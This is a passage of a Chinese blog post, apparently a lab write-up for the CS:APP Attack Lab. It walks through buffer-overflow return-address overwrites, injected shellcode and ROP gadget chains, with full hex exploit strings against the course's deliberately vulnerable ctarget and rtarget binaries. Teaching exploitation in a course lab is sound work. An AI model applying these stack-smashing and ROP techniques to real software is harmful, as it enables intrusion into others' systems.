                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-06 10:06:12" itemprop="dateModified" datetime="2022-03-06T10:06:12+08:00">2022-03-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>9.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>纸上得来终觉浅，绝知此事要躬行</p>
</blockquote>
<h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p>Attack！成为一名黑客不正是我小时候的梦想吗？这个实验一定会很有趣。</p>
<p>CMU 对本实验的官方说明文档：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf%EF%BC%8C%E6%8C%89%E7%85%A7">http://csapp.cs.cmu.edu/3e/attacklab.pdf，按照</a> CMU 的文档一步步往下走就可以了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220303225536519.png" alt="image-20220303225536519"></p>
<h1 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h1><p>在第一部分中，我们要攻击的是<code>ctarget</code>。利用<strong>缓冲区溢出</strong>，就是程序的栈中分配某个字符数组来保存一个字符串，而我们输入的字符串可以包含一些可执行代码的字节编码或者一个指向攻击代码的指针覆盖返回地址。那么就能直接实现直接攻击或者在执行<code>ret</code>指令后跳转到攻击代码。</p>
<h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先给了<code>test</code>函数的C语言代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数调用了<code>getbuf</code>函数，题目要求我们通过代码注入的方式使<code>getbuf</code>执行结束后不返回到<code>test</code>函数中，而是返回到<code>touch1</code>函数。</p>
<p><code>touch1</code>的C语言代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="反汇编test"><a href="#反汇编test" class="headerlink" title="反汇编test"></a>反汇编<code>test</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt;</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br><span class="line">   0x0000000000401978 &lt;+16&gt;:    mov    $0x403188,%esi</span><br><span class="line">   0x000000000040197d &lt;+21&gt;:    mov    $0x1,%edi</span><br><span class="line">   0x0000000000401982 &lt;+26&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000401987 &lt;+31&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x000000000040198c &lt;+36&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000401990 &lt;+40&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>第2行分配栈帧，第4行调用<code>getbuf</code>函数</p>
<h3 id="反汇编getbuf"><a href="#反汇编getbuf" class="headerlink" title="反汇编getbuf"></a>反汇编<code>getbuf</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>分配了40个字节的栈帧，随后将栈顶位置作为参数调用<code>Gets</code>函数，读入字符串。</p>
<p>此时，栈帧情况是这样的：（以8个字节为单位）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305095612188.png" alt="image-20220305095612188"></p>
<p>查到<code>touch1</code>代码地址为：<code>0x4017c0</code></p>
<p>由此就有了思路，我们只需要输入41个字符，前40个字节将<code>getbuf</code>的栈空间填满，最后一个字节将返回值覆盖为<code>0x4017c0</code>即<code>touch1</code>的地址，这样，在<code>getbuf</code>执行<code>retq</code>指令后，程序就会跳转执行<code>touch1</code>函数。</p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>采用<code>Write up</code>推荐方法，创建一个<code>txt</code>文档存储输入。并按照<code>HEX2RAW</code>工具的说明，在每个字节间用空格或回车隔开。</p>
<p><strong><code>x86</code>采用小端存储，要注意输入字节的顺序</strong></p>
<p>我们的输入为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>执行命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; ctarget01.txt | ./ctarget -q</span><br></pre></td></tr></table></figure>

<ul>
<li><code>./hex2raw &lt; ctarget01.txt</code>是利用<code>hex2raw</code>工具将我们的输入看作字节级的十六进制表示进行转化，用来生成攻击字符串</li>
<li><code>|</code>表示管道，将转化后的输入文件作为<code>ctarget</code>的输入参数</li>
<li>由于执行程序会默认连接 CMU 的服务器，<code>-q</code>表示取消这一连接</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220304093523423.png" alt="image-20220304093523423"></p>
<p><strong>攻击成功！</strong></p>
<h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>本题结构与上题相同，不同的是调用的<code>touch2</code>函数的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不仅需要修改返回地址调用<code>touch2</code>函数，还需要把<code>cookie</code>作为参数传进去。题目建议我们不使用<code>jmp</code>和<code>call</code>指令进行代码跳转，也就是说，只能通过在栈中保存目标代码的地址，然后以<code>ret</code>的形式进行跳转。</p>
<p><strong>我们先深入理解<code>ret</code>指令：</strong></p>
<p>在CPU中有一个“PC”即程序寄存器，在 x86-64 中用<code>%rip</code>表示，它时刻指向将要执行的下一条指令在内存中的地址。而我们的<code>ret</code>指令就相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop %rip</span><br></pre></td></tr></table></figure>

<p>即把栈中存放的地址弹出作为下一条指令的地址。</p>
<p>于是，利用<code>push</code>和<code>ret</code>就能实现我们的指令转移啦！</p>
<p>思路如下：</p>
<ul>
<li><p>首先，通过字符串输入把<code>caller</code>的栈中储存的返回地址改为注入代码的存放地址</p>
</li>
<li><p>然后，编写代码。我们的代码应该完成哪些工作呢？</p>
<ul>
<li>查看<code>cookie</code>值为<code>0x59b997fa</code>，先将第一个参数寄存器修改为该值</li>
<li>在栈中压入<code>touch2</code>代码地址</li>
<li><code>ret</code>指令调用返回地址也就是<code>touch2</code></li>
</ul>
</li>
<li><p>确定注入代码的地址。代码应该存在<code>getbuf</code>分配的栈中，地址为<code>getbuf</code>函数中的栈顶</p>
</li>
</ul>
<h3 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h3><p>查到<code>touch2</code>代码地址为：<code>0x4017c0</code>，由上述思路，得代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x59b997fa, %rdi</span><br><span class="line">pushq   $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>利用<code>gdb</code>在<code>getbuf</code>分配栈帧后打断点，查看栈顶指针的位置</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220304175128141.png" alt="image-20220304175128141"></p>
<p><code>0x5561dc78</code>这就是我们应该修改的返回地址</p>
<h3 id="栈帧讲解"><a href="#栈帧讲解" class="headerlink" title="栈帧讲解"></a>栈帧讲解</h3><p>按照我们的思路，输入字符串后的栈帧应该是这样的</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305095954954.png" alt="image-20220305095954954"></p>
<p>逻辑如下：</p>
<ul>
<li><code>getbuf</code>执行<code>ret</code>指令后，注入代码的地址从栈中弹出</li>
<li>程序执行我们编写的代码，当再次执行<code>ret</code>后，从栈中弹出的就是我们压入的<code>touch2</code>函数的地址，成功跳转</li>
</ul>
<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>先将我们的汇编代码保存到一个<code>.s</code>文件中，接下来利用如下指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c injectcode.s</span><br><span class="line">objdump -d injectcode.o &gt; injectcode.d</span><br></pre></td></tr></table></figure>

<p>得到字节级表示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>将这段代码放到40个字节中的开头，代码地址放到末尾。于是就得到我们的输入为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 </span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220304233752252.png" alt="image-20220304233752252"></p>
<p><strong>攻击成功！</strong></p>
<h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>本题与上题类似，不同点在于传的参数是一个字符串。先给出<code>touch3</code>的C语言代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>touch3</code>中调用了<code>hexmatch</code>，它的C语言代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，我们要把<code>cookie</code>转换成对应的字符串传进去</p>
<p>注意第6行，<code>s</code>的位置是随机的，我们写在<code>getbuf</code>栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。</p>
<p>因此，考虑把<code>cookie</code>的字符串数据存在<code>test</code>的栈上，其它部分与上题相同，这里不再重复思路。</p>
<h3 id="注入代码-1"><a href="#注入代码-1" class="headerlink" title="注入代码"></a>注入代码</h3><p>先查找<code>test</code>栈顶指针的位置：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305094755965.png" alt="image-20220305094755965"></p>
<p><code>0x5561dca8</code>，这就是我们字符串存放的位置，也是调用<code>touch3</code>应该传入的参数，又<code>touch3</code>代码的地址为<code>4018fa</code>。从而得到代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x5561dca8, %rdi</span><br><span class="line">pushq   $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>字节级表示为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>

<h3 id="栈帧讲解-1"><a href="#栈帧讲解-1" class="headerlink" title="栈帧讲解"></a>栈帧讲解</h3><p>我们期望的栈帧应该是这样的：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305101326911.png" alt="image-20220305101326911"></p>
<p>逻辑如下：</p>
<ul>
<li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到我们注入的代码</li>
<li>代码执行，先将存在<code>caller</code>的栈中的字符串传给参数寄存器<code>%rdi</code>，再将<code>touch3</code>的地址压入栈中</li>
<li>代码执行<code>ret</code>，从栈中弹出<code>touch3</code>指令，成功跳转</li>
</ul>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>我们的cookie<code>0x59b997fa</code>作为字符串转换为<code>ASCII</code>为：<code>35 39 62 39 39 37 66 61</code></p>
<p>注入代码段的地址与上题一样，同样为<code>0x5561dc78</code></p>
<p>由于在<code>test</code>栈帧中多利用了一个字节存放cookie，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的<code>ASCII</code> 。于是得到如下输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305102649568.png" alt="image-20220305102649568"></p>
<p><strong>攻击成功！</strong></p>
<p><code>Part 1</code>就此完结啦！</p>
<h1 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h1><p>在第二部分中，我们要攻击的是<code>rtarget</code>，它的代码内容与第一部分基本相同，但是攻击它却比第一部分要难得多，主要是因为它采用了两种策略来对抗缓冲区溢出攻击</p>
<ul>
<li>栈随机化。这段程序分配的栈的位置在每次运行时都是随机的，这就使我们无法确定在哪里插入代码</li>
<li>限制可执行代码区域。它限制栈上存放的代码是不可执行的。</li>
</ul>
<p>看到这里，我不禁一头雾水，这下子该怎么攻击啊？</p>
<p>庆幸的是，文档也提供了攻击策略，即<strong>ROP：面向返回的程序设计</strong>，就是在已经存在的程序中找到特定的以<code>ret</code>结尾的指令序列为我们所用，称这样的代码段为<code>gadget</code>，把要用到部分的地址压入栈中，每次<code>ret</code>后又会取出一个新的<code>gadget</code>，于是这样就能形成一个程序链，实现我们的目的。<strong>我喜欢将这种攻击方式称作“就地取材，拼凑代码”</strong>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305141735521.png" alt="image-20220305141735521"></p>
<p>同时，我们有如下指令编码表：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305135105263.png" alt="image-20220305135105263"></p>
<p><strong>举个例子：</strong></p>
<p><code>rtarget</code>有这样一个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setval_210</span><span class="params">(<span class="type">unsigned</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它的汇编代码字节级表示为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">	400f15: c7 07 d4 48 89 c7 	movl $0xc78948d4,(%rdi)</span><br><span class="line">	400f1b: c3 					retq</span><br></pre></td></tr></table></figure>

<p>查表可知，取其中一部分字节序列 48 89 c7 就表示指令<code>movq %rax, %rdi</code>，这整句指令的地址为<code>0x400f15</code>，于是从<code>0x400f18</code>开始的代码就可以变成下面这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>这个小片段就可以作为一个<code>gadget</code>为我们所用。</p>
<p>其它一些我们可以利用的代码都在文件<code>farm.c</code>中展示了出来</p>
<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>本题的任务与<code>Phase 2</code>相同，都是要求返回到<code>touch2</code>函数，<code>phase 2</code>中用到的注入代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x59b997fa, %rdi</span><br><span class="line">pushq   $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>我们根本不可能找到这种带特定立即数的<code>gadget</code>，只能思考其他办法。</p>
<p>首先，要做的是把 cookie 赋值给参数寄存器<code>%rdi</code>，考虑将 cookie 放在栈中，再用指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>就能实现参数的赋值了，当<code>ret</code>后，从栈中取出来的程序地址再设置为<code>touch2</code>的地址就能成功解决本题</p>
<p>但是后来发现在<code>farm</code>中找不到这条指令的<code>gadget</code>，经过多次尝试，只好用其他寄存器进行中转，考虑用两个<code>gadget</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">ret</span><br><span class="line">###############</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<h3 id="栈帧讲解-2"><a href="#栈帧讲解-2" class="headerlink" title="栈帧讲解"></a>栈帧讲解</h3><p>根据我们的思路，栈帧情况如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305153502546.png" alt="image-20220305153502546"></p>
<p>逻辑如下：</p>
<ul>
<li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到我们的<code>gardget01</code></li>
<li><code>gadget01</code>执行，将<code>cookie</code>弹出，赋值给<code>%rax</code>，然后执行<code>ret</code>，继续弹出返回地址，跳转到<code>gardget2</code></li>
<li><code>gardget2</code>执行，将<code>cookie</code>值成功赋值给参数寄存器<code>%rdi</code>，然后执行<code>ret</code>，继续弹出返回地址，跳转到<code>touch2</code></li>
</ul>
<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>首要问题是找到我们需要的<code>gadget</code></p>
<p>先用如下指令得到<code>target</code>的汇编代码及字节级表示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.s</span><br></pre></td></tr></table></figure>

<p>查表知，<code>pop %rax</code>用<code>58</code>表示，于是查找<code>58</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:       c3                      retq                   retq</span><br></pre></td></tr></table></figure>

<p>得到指令地址为<code>0x4019ab</code></p>
<p><code>movq %rax, %rdi</code>表示为<code>48 89 c7</code>，刚好能找到！其中 90 表示“空”，可以忽略</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:       c3                      retq</span><br></pre></td></tr></table></figure>

<p>得到指令地址为<code>0x4019c5</code></p>
<p>根据上图的栈帧，就能写出我们的输入序列：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305161143538.png" alt="image-20220305161143538"></p>
<p><strong>攻击成功！</strong></p>
<h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h2><p>先附上<code>Write up</code>中来自 CMU 官方的劝退：</p>
<blockquote>
